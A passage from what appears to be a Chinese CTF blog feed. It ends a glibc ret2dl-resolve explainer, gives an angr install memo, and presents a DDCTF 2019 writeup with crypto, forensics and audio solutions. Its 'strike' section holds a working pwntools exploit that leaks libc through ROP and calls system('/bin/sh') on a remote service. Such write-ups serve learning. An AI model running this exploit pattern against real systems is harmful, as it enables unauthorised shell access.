class="line"><span class="function">    </span>= (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_SYMTAB]);</span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> *strtab = (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[DT_STRTAB]);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//通过参数reloc_arg计算重定位入口，这里的DT_JMPREL即.rel.plt, reloc_offset即reloc_arg</span></span><br><span class="line">  <span class="keyword">const</span> PLTREL *<span class="keyword">const</span> reloc</span><br><span class="line">    = (<span class="keyword">const</span> <span class="keyword">void</span> *) (D_PTR (l, l_info[DT_JMPREL]) + reloc_offset);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//根据函数重定位表中的动态链接符号表索引，即r_info字段，获取函数在动态链接符号表中对应的条目。</span></span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Sym)</span> *sym </span>= &amp;symtab[ELFW(R_SYM) (reloc-&gt;r_info)];</span><br><span class="line">  <span class="keyword">void</span> *<span class="keyword">const</span> rel_addr = (<span class="keyword">void</span> *)(l-&gt;l_addr + reloc-&gt;r_offset);</span><br><span class="line">  <span class="keyword">lookup_t</span> result;</span><br><span class="line">  DL_FIXUP_VALUE_TYPE value;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Sanity check that we're really looking at a PLT relocation.  */</span></span><br><span class="line">  assert (ELFW(R_TYPE)(reloc-&gt;r_info) == ELF_MACHINE_JMP_SLOT);</span><br><span class="line"></span><br><span class="line">   <span class="comment">/* Look up the target symbol.  If the normal lookup rules are not</span></span><br><span class="line"><span class="comment">      used don't look in the global scope.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__builtin_expect (ELFW(ST_VISIBILITY) (sym-&gt;st_other), <span class="number">0</span>) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">r_found_version</span> *<span class="title">version</span> = <span class="title">NULL</span>;</span></span><br><span class="line"></span><br><span class="line">      <span class="keyword">if</span> (l-&gt;l_info[VERSYMIDX (DT_VERSYM)] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="function"><span class="keyword">const</span> <span class="title">ElfW</span><span class="params">(Half)</span> *vernum </span>=</span><br><span class="line">    (<span class="keyword">const</span> <span class="keyword">void</span> *) D_PTR (l, l_info[VERSYMIDX (DT_VERSYM)]);</span><br><span class="line">  ElfW(Half) ndx = vernum[ELFW(R_SYM) (reloc-&gt;r_info)] &amp; <span class="number">0x7fff</span>;</span><br><span class="line">  version = &amp;l-&gt;l_versions[ndx];</span><br><span class="line">  <span class="keyword">if</span> (version-&gt;hash == <span class="number">0</span>)</span><br><span class="line">    version = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We need to keep the scope around so do some locking.  This is</span></span><br><span class="line"><span class="comment"> not necessary for objects which cannot be unloaded or when</span></span><br><span class="line"><span class="comment"> we are not using any threads (yet).  */</span></span><br><span class="line">      <span class="keyword">int</span> flags = DL_LOOKUP_ADD_DEPENDENCY;</span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">&#123;</span><br><span class="line">  THREAD_GSCOPE_SET_FLAG ();</span><br><span class="line">  flags |= DL_LOOKUP_GSCOPE_LOCK;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_ENABLE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_ENABLE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line">      <span class="comment">//根据strtab+sym-&gt;st_name在字符串表中找到函数名，然后进行符号查找获取libc基地址result</span></span><br><span class="line">      result = _dl_lookup_symbol_x (strtab + sym-&gt;st_name, l, &amp;sym, l-&gt;l_scope,</span><br><span class="line">    version, ELF_RTYPE_CLASS_PLT, flags, <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* We are done with the global scope.  */</span></span><br><span class="line">      <span class="keyword">if</span> (!RTLD_SINGLE_THREAD_P)</span><br><span class="line">THREAD_GSCOPE_RESET_FLAG ();</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> RTLD_FINALIZE_FOREIGN_CALL</span></span><br><span class="line">      RTLD_FINALIZE_FOREIGN_CALL;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">      <span class="comment">/* Currently result contains the base load address (or link map)</span></span><br><span class="line"><span class="comment"> of the object that defines sym.  Now add in the symbol</span></span><br><span class="line"><span class="comment"> offset.  */</span></span><br><span class="line"> <span class="comment">//将要解析的函数的偏移地址加上libc基址，就可以获取函数的实际地址</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (result,</span><br><span class="line">   sym ? (LOOKUP_VALUE_ADDRESS (result)</span><br><span class="line">  + sym-&gt;st_value) : <span class="number">0</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* We already found the symbol.  The module (and therefore its load</span></span><br><span class="line"><span class="comment"> address) is also known.  */</span></span><br><span class="line">      value = DL_FIXUP_MAKE_VALUE (l, l-&gt;l_addr + sym-&gt;st_value);</span><br><span class="line">      result = l;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* And now perhaps the relocation addend.  */</span></span><br><span class="line">  value = elf_machine_plt_value (l, reloc, value);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将已经解析完的函数地址写入相应的GOT表中</span></span><br><span class="line">  <span class="keyword">if</span> (sym != <span class="literal">NULL</span></span><br><span class="line">      &amp;&amp; __builtin_expect (ELFW(ST_TYPE) (sym-&gt;st_info) == STT_GNU_IFUNC, <span class="number">0</span>))</span><br><span class="line">    value = elf_ifunc_invoke (DL_FIXUP_VALUE_ADDR (value));</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Finally, fix up the plt itself.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (GLRO(dl_bind_not)))</span><br><span class="line">    <span class="keyword">return</span> value;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> elf_machine_fixup_plt (l, result, reloc, rel_addr, value);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2><span id="32位情况下构造payload">32位情况下构造payload</span></h2><h3><span id="回顾">回顾</span></h3><p>回顾整个动态链接的过程：调用fun，直接call fun@plt, jmp到<a href="mailto:fun@got.plt" target="_blank" rel="noopener">fun@got.plt</a>再jmp回来，先把把fun的reloc_arg压栈，然后跳到plt0把link_map_obj压栈调用__dl_runtime_resolve. 再调用dl_fixup，通过rel_arg前24位找到函数重定位表项，然后根据函数重定位表项的r_info找到动态链接符号表，确定符号表表项之后做一些类型检查再通过符号表表项的st_name确定动态链接字符串表表项,这个表项值就是函数名称了。</p><h3><span id="构造payload">构造payload</span></h3><ul><li>思路：伪造reloc_arg,使得函数重定位表项落在可控内存段，就可以伪造r_offset和r_info让动态链接符号表表项落在可控区域，接着伪造st_name让动态链接字符串表项值为目标函数名称。</li></ul>]]></content>
      
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>OSX装angr</title>
      <link href="/2019/04/20/OSX%E8%A3%85angr/"/>
      <url>/2019/04/20/OSX%E8%A3%85angr/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><blockquote><p>纯粹备忘，OSX装angr老出问题，记得用python3的virtualenv</p></blockquote><a id="more"></a><h2><span id="虚拟环境里装unicorn">虚拟环境里装unicorn</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">CC=/usr/<span class="built_in">local</span>/bin/gcc-8 UNICORN_QEMU_FLAGS=<span class="string">"--python=/path/to/python2"</span> pip install unicorn  <span class="comment"># 填系统的python2可以</span></span><br></pre></td></tr></table></figure><h2><span id="修复angr问题">修复angr问题</span></h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">PYVEX=`python -c <span class="string">'import pyvex; print(pyvex.__path__[0])'</span>`</span><br><span class="line">UNICORN=`python -c <span class="string">'import unicorn; print(unicorn.__path__[0])'</span>`</span><br><span class="line">ANGR=`python -c <span class="string">'import angr; print(angr.__path__[0])'</span>`</span><br><span class="line"></span><br><span class="line">install_name_tool -change libunicorn.1.dylib <span class="string">"<span class="variable">$UNICORN</span>"</span>/lib/libunicorn.dylib <span class="string">"<span class="variable">$ANGR</span>"</span>/lib/angr_native.dylib</span><br><span class="line">install_name_tool -change libpyvex.dylib <span class="string">"<span class="variable">$PYVEX</span>"</span>/lib/libpyvex.dylib <span class="string">"<span class="variable">$ANGR</span>"</span>/lib/angr_native.dylib</span><br></pre></td></tr></table></figure><p>这里因为在python3的virtualenv里，直接写python就行</p>]]></content>
      
      
      
        <tags>
            
            <tag> angr </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DDCTF 2019 Writeup</title>
      <link href="/2019/04/19/DDCTF-2019-WriteUp/"/>
      <url>/2019/04/19/DDCTF-2019-WriteUp/</url>
      
        <content type="html"><![CDATA[<h2><span id="写在前面">写在前面</span></h2><p>基本没有pwn题,唯一一个还放在misc里了。。实在是有点难受，别的题算挺简单的，断断续续打了几天，记录一下吧。过几天抽空学一下pwn更多的技巧和angr、还有比较想学的是android类型的安全问题，继续加油<br><a id="more"></a></p><h2><span id="misc">misc</span></h2><h3><span id="真-签到题">真-签到题</span></h3><p><code>DDCTF{return DDCTF::get(2019)-&gt;flagOf(0);}</code></p><h3><span id="北京地铁">北京地铁</span></h3><p>lsb隐写的密文，zsteg提取：<br>秘钥提示在地铁图上，魏公村被标记了一下，用小写字母补\x00得到秘钥，ECB解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"><span class="keyword">import</span> base64 <span class="keyword">as</span> b</span><br><span class="line">obj = AES.new(<span class="string">'weigongcun'</span>+<span class="string">'\x00'</span>*<span class="number">6</span>, AES.MODE_ECB)</span><br><span class="line"><span class="keyword">print</span> obj.decrypt(b.b64decode(<span class="string">'iKk/Ju3vu4wOnssdIaUSrg=='</span>))</span><br></pre></td></tr></table></figure><h3><span id="strike">strike</span></h3><p>一开始以为简单溢出一下过大小的check、然后rop一个puts泄露libc就行了。结果error也是很吃惊，看了下汇编发现在esp上动了手脚，esp跑飞了。所以先打出栈地址然后rop就getshell了</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.log_level = <span class="string">'debug'</span></span><br><span class="line">libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./xpwn'</span>)</span><br><span class="line"></span><br><span class="line">p = remote(sys.argv[<span class="number">1</span>], sys.argv[<span class="number">2</span>])</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">'h'</span>*<span class="number">39</span>)</span><br><span class="line">p.recvuntil(<span class="string">'hhh\n'</span>)</span><br><span class="line">ebp_addr = u32(p.recvuntil(<span class="string">'password: '</span>)[:<span class="number">4</span>])</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">"leak libc_start_main_got addr and return to main again"</span></span><br><span class="line">payload = <span class="string">'1'</span> * <span class="number">68</span> + p32(ebp_addr + <span class="number">8</span>) + <span class="string">'a'</span>*<span class="number">8</span></span><br><span class="line">payload += p32(elf.plt[<span class="string">'puts'</span>]) + p32(<span class="number">0x8048669</span>) + p32(elf.got[<span class="string">'__libc_start_main'</span>])</span><br><span class="line">p.send(payload)</span><br><span class="line">p.recvuntil(<span class="string">'bye!\n'</span>)</span><br><span class="line"></span><br><span class="line">libc_start_addr = u32(p.recvuntil(<span class="string">'Enter username: '</span>)[:<span class="number">4</span>])</span><br><span class="line"><span class="keyword">print</span> hex(libc_start_addr)</span><br><span class="line"></span><br><span class="line">libc_base = libc_start_addr - libc.symbols[<span class="string">'__libc_start_main'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'libc_base'</span>,hex(libc_base)</span><br><span class="line">system_addr = libc_base + libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"><span class="keyword">print</span> <span class="string">'system_addr '</span>,hex(system_addr)</span><br><span class="line"></span><br><span class="line">shell_str = libc_base+libc.search(<span class="string">'/bin/sh'</span>).next()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">'h'</span>*<span class="number">39</span>)</span><br><span class="line">p.recvuntil(<span class="string">'hhh\n'</span>)</span><br><span class="line">ebp_addr = u32(p.recvuntil(<span class="string">'password: '</span>)[:<span class="number">4</span>])</span><br><span class="line">pause()</span><br><span class="line">p.sendline(<span class="string">'-1'</span>)</span><br><span class="line">p.recv()</span><br><span class="line">payload = <span class="string">'1'</span> * <span class="number">68</span> + p32(ebp_addr + <span class="number">8</span>) + <span class="string">'a'</span>*<span class="number">8</span> </span><br><span class="line">payload += p32(system_addr) + p32(<span class="number">0x8048669</span>) + p32(shell_str)</span><br><span class="line">p.send(payload)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h3><span id="wireshark">Wireshark</span></h3><p>看http流量可以发现先访问了一个图片隐写站点，然后流量里一共有三张图。扣出来之后有一个无法显示，猜测是crc校验不对，根据crc爆破一下高度就可以看到key。然后访问图片隐写的站点拿另外两张图分别试一下，解密成功。转成ascii即可<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#图片中隐藏的信息为：flag+AHs-#44444354467B4E62756942556C52356C687777324F6670456D75655A6436344F6C524A3144327D+AH0-</span></span><br><span class="line">In [<span class="number">1</span>]: <span class="string">'44444354467B4E62756942556C52356C687777324F6670456D75655A6436344F6C524A3144327D'</span>.decode(<span class="string">'hex'</span>)</span><br><span class="line">Out[<span class="number">1</span>]: <span class="string">'DDCTF&#123;NbuiBUlR5lhww2OfpEmueZd64OlRJ1D2&#125;'</span></span><br></pre></td></tr></table></figure></p><h3><span id="联盟决策大会">联盟决策大会</span></h3><p>正常拉格朗日差值，1组和2组分别恢复秘密key1和key2，然后用key1，key2恢复秘密key。用sage写一下跑出来是16进制编码，转成ascii得到flag</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">R = PolynomialRing(ZZ,<span class="string">'x'</span>)</span><br><span class="line">p =<span class="number">0xC45467BBF4C87D781F903249243DF8EE868EBF7B090203D2AB0EDA8EA48719ECE9B914F9F5D0795C23BF627E3ED40FBDE968251984513ACC2B627B4A483A6533</span></span><br><span class="line">k = [<span class="number">0x729FB38DB9E561487DCE6BC4FB18F4C7E1797E6B052AFAAF56B5C189D847EAFC4F29B4EB86F6E678E0EDB1777357A0A33D24D3301FC9956FFBEA5EA6B6A3D50E</span>,</span><br><span class="line">    <span class="number">0x478B973CC7111CD31547FC1BD1B2AAD19522420979200EBA772DECC1E2CFFCAE34771C49B5821E9C0DDED7C24879484234C8BE8A0B607D8F7AF0AAAC7C7F19C6</span>,</span><br><span class="line">    <span class="number">0xBFCFBAD74A23B3CC14AF1736C790A7BC11CD08141FB805BCD9227A6E9109A83924ADEEDBC343464D42663AB5087AE26444A1E42B688A8ADCD7CF2BA7F75CD89D</span>,</span><br><span class="line">    <span class="number">0x9D3D3DBDDA2445D0FE8C6DFBB84C2C30947029E912D7FB183C425C645A85041419B89E25DD8492826BD709A0A494BE36CEF44ADE376317E7A0C70633E3091A61</span>,</span><br><span class="line">    <span class="number">0x79F9F4454E84F32535AA25B8988C77283E4ECF72795014286707982E57E46004B946E42FB4BE9D22697393FC7A6C33A27CE0D8BFC990A494C12934D61D8A2BA8</span>,</span><br><span class="line">    <span class="number">0x2A074DA35B3111F1B593F869093E5D5548CCBB8C0ADA0EBBA936733A21C513ECF36B83B7119A6F5BEC6F472444A3CE2368E5A6EBF96603B3CD10EAE858150510</span>]</span><br><span class="line"></span><br><span class="line">poly1 = R(k[<span class="number">0</span>]*(x<span class="number">-2</span>)*(x<span class="number">-4</span>)*inverse_mod((<span class="number">1</span><span class="number">-2</span>)*(<span class="number">1</span><span class="number">-4</span>),p))+R(k[<span class="number">1</span>]*(x<span class="number">-1</span>)*(x<span class="number">-4</span>)*inverse_mod((<span class="number">2</span><span class="number">-1</span>)*(<span class="number">2</span><span class="number">-4</span>),p))+R(k[<span class="number">2</span>]*(x<span class="number">-1</span>)*(x<span class="number">-2</span>)*inverse_mod((<span class="number">4</span><span class="number">-1</span>)*(<span class="number">4</span><span class="number">-2</span>),p))</span><br><span class="line">poly2 = R(k[<span class="number">3</span>]*(x<span class="number">-4</span>)*(x<span class="number">-5</span>)*inverse_mod(<span class="number">3</span><span class="number">-4</span>,p)*inverse_mod(<span class="number">3</span><span class="number">-5</span>,p))+R(k[<span class="number">4</span>]*(x<span class="number">-3</span>)*(x<span class="number">-5</span>)*inverse_mod(<span class="number">4</span><span class="number">-3</span>,p)*inverse_mod(<span class="number">4</span><span class="number">-5</span>,p))+R(k[<span class="number">5</span>]*(x<span class="number">-3</span>)*(x<span class="number">-4</span>)*inverse_mod(<span class="number">5</span><span class="number">-3</span>,p)*inverse_mod(<span class="number">5</span><span class="number">-4</span>,p))</span><br><span class="line">k1 = int(hex(poly1(<span class="number">0</span>)%p),<span class="number">16</span>)</span><br><span class="line">k2 = int(hex(poly2(<span class="number">0</span>)%p),<span class="number">16</span>)</span><br><span class="line">poly3 = R(k1*(x<span class="number">-2</span>)*inverse_mod(<span class="number">1</span><span class="number">-2</span>,p))+R(k2*(x<span class="number">-1</span>)*inverse_mod(<span class="number">2</span><span class="number">-1</span>,p))</span><br><span class="line"><span class="keyword">print</span> hex(poly3(<span class="number">0</span>)%p)</span><br></pre></td></tr></table></figure><h3><span id="伪-声纹锁">伪-声纹锁</span></h3><p>根据提示写一个istft，刚开始跑出来距离题目要求的偏差小于0.001并没有实现，噪声还有点大，然后就试着取实部虚部的max、min、还有均值，发现均值的效果最好。拿AU去噪声，人声增强听了之后可以开始听了，有点听不出来的大概有三位，给出可能的结果、写个脚本比较有意义的flag就ok了。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- encoding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># written in python 3.6</span></span><br><span class="line">__author__ = <span class="string">'garzon'</span></span><br><span class="line"><span class="keyword">import</span> cmath</span><br><span class="line"><span class="keyword">import</span> librosa <span class="comment"># v0.6.2, maybe ffmpeg is needed as backend</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np <span class="comment"># v1.15.4</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image <span class="comment"># Pillow v5.4.1</span></span><br><span class="line"></span><br><span class="line">window_size = <span class="number">2048</span></span><br><span class="line">step_size = <span class="number">100</span></span><br><span class="line">max_lim = <span class="number">0.15</span></span><br><span class="line">f_ubound = <span class="number">2000</span></span><br><span class="line">f_bins = <span class="number">150</span></span><br><span class="line">sr = <span class="number">15000</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">transform_x</span><span class="params">(x, f_ubound=f_ubound, f_bins=f_bins)</span>:</span></span><br><span class="line">    freqs = np.logspace(np.log10(<span class="number">20</span>), np.log10(f_ubound), f_bins)</span><br><span class="line">    seqs = []</span><br><span class="line">    <span class="keyword">for</span> f <span class="keyword">in</span> freqs:</span><br><span class="line">        seq = []</span><br><span class="line">        d = cmath.exp(<span class="number">-2j</span> * cmath.pi * f / sr)</span><br><span class="line">        coeff = <span class="number">1</span></span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> range(len(x)):</span><br><span class="line">            seq.append(x[t] * coeff)</span><br><span class="line">            coeff *= d</span><br><span class="line">        seqs.append(seq)</span><br><span class="line">    sums = []</span><br><span class="line">    <span class="keyword">for</span> seq <span class="keyword">in</span> seqs:</span><br><span class="line">        X = [sum(seq[:window_size])/window_size]</span><br><span class="line">        <span class="keyword">for</span> t <span class="keyword">in</span> range(step_size, len(x), step_size):</span><br><span class="line">            X.append(X[<span class="number">-1</span>]-sum(seq[t-step_size:t])/window_size)</span><br><span class="line">            <span class="keyword">if</span> t+window_size-step_size &lt; len(x): X[<span class="number">-1</span>] += sum(seq[t+window_size-step_size:t+window_size])/window_size</span><br><span class="line">        sums.append(X)</span><br><span class="line">    <span class="keyword">return</span> freqs, np.array(sums)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">calc_diff</span><span class="params">(x, spec)</span>:</span></span><br><span class="line">    f, x = transform_x(x)</span><br><span class="line">    print(x.shape)</span><br><span class="line">    print(spec.shape)</span><br><span class="line">    <span class="keyword">if</span> x.shape != spec.shape: <span class="keyword">return</span> <span class="number">999</span></span><br><span class="line">    print((np.abs(x)-np.abs(spec)))</span><br><span class="line">    <span class="keyword">return</span> np.average((np.abs(x)-np.abs(spec))**<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">linear_map</span><span class="params">(v, old_dbound, old_ubound, new_dbound, new_ubound)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> (v-old_dbound)*<span class="number">1.0</span>/(old_ubound-old_dbound)*(new_ubound-new_dbound) + new_dbound</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">image_to_array</span><span class="params">(img)</span>:</span></span><br><span class="line">    img_arr = linear_map(np.array(img.getdata(), np.uint8).reshape(img.size[<span class="number">1</span>], img.size[<span class="number">0</span>], <span class="number">3</span>), <span class="number">0</span>, <span class="number">255</span>, -max_lim, max_lim)</span><br><span class="line">    <span class="keyword">return</span> img_arr[:, :, <span class="number">1</span>] + img_arr[:, :, <span class="number">2</span>] * <span class="number">1j</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">istft</span><span class="params">(stftdata)</span>:</span></span><br><span class="line">    meta =  np.matrix.tolist(stftdata)</span><br><span class="line">    freqs = np.logspace(np.log10(<span class="number">20</span>), np.log10(f_ubound), f_bins)</span><br><span class="line">    fragment = stftdata.shape[<span class="number">1</span>]*step_size</span><br><span class="line">    wav = [<span class="number">0</span> <span class="keyword">for</span> _ <span class="keyword">in</span> range(fragment+window_size)]</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> idx_m <span class="keyword">in</span> range(stftdata.shape[<span class="number">1</span>]):</span><br><span class="line">        <span class="keyword">for</span> idx_w <span class="keyword">in</span> range(step_size*idx_m,step_size*idx_m+window_size):</span><br><span class="line">            idft = <span class="number">0</span></span><br><span class="line">            <span class="keyword">for</span> idx_f <span class="keyword">in</span> range(len(freqs)):</span><br><span class="line">                idft+=meta[idx_f][idx_m]*cmath.exp(<span class="number">2j</span>*cmath.pi*freqs[idx_f]*idx_w/sr)</span><br><span class="line">            wav[idx_w]+=idft</span><br><span class="line">    <span class="keyword">return</span> wav[:fragment]</span><br><span class="line"></span><br><span class="line">img_data = image_to_array(Image.open(<span class="string">'fingerprint.png'</span>))</span><br><span class="line">print(img_data.shape)</span><br><span class="line">wav_data = istft(img_data)</span><br><span class="line">min_d = np.zeros(len(wav_data))</span><br><span class="line">max_d = np.zeros(len(wav_data))</span><br><span class="line">mean_d = np.zeros(len(wav_data))</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(wav_data)):</span><br><span class="line">    min_d[i] = min(wav_data[i].real,wav_data[i].imag)</span><br><span class="line">    max_d[i] = max(wav_data[i].real,wav_data[i].imag)</span><br><span class="line">    mean_d[i] = (wav_data[i].real+wav_data[i].imag)/<span class="number">2</span></span><br><span class="line"></span><br><span class="line">print(<span class="string">'write wav'</span>)</span><br><span class="line">librosa.output.write_wav(<span class="string">'min.wav'</span>, np.array(min_d), sr=sr)</span><br><span class="line">librosa.output.write_wav(<span class="string">'max.wav'</span>, np.array(max_d), sr=sr)</span><br><span class="line">librosa.output.write_wav(<span class="string">'mean.wav'</span>, np.array(mean_d), sr=sr)</span><br><span class="line"></span><br><span class="line">print(<span class="string">'min'</span>)</span><br><span class="line">sqr_diff = calc_diff(min_d, img_data)</span><br><span class="line">print(<span class="string">'sqr diff ='</span>, sqr_diff)</span><br><span class="line"><span class="keyword">if</span> sqr_diff &lt; <span class="number">0.001</span>:</span><br><span class="line">    print(<span class="string">'access granted, congratulations!'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'access denied'</span>)</span><br><span class="line">    </span><br><span class="line">print(<span class="string">'max'</span>)</span><br><span class="line">sqr_diff = calc_diff(max_d, img_data)</span><br><span class="line">print(<span class="string">'sqr diff ='</span>, sqr_diff)</span><br><span class="line"><span class="keyword">if</span> sqr_diff &lt; <span class="number">0.001</span>:</span><br><span class="line">    print(<span class="string">'access granted, congratulations!'</span>)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    print(<span class="string">'access 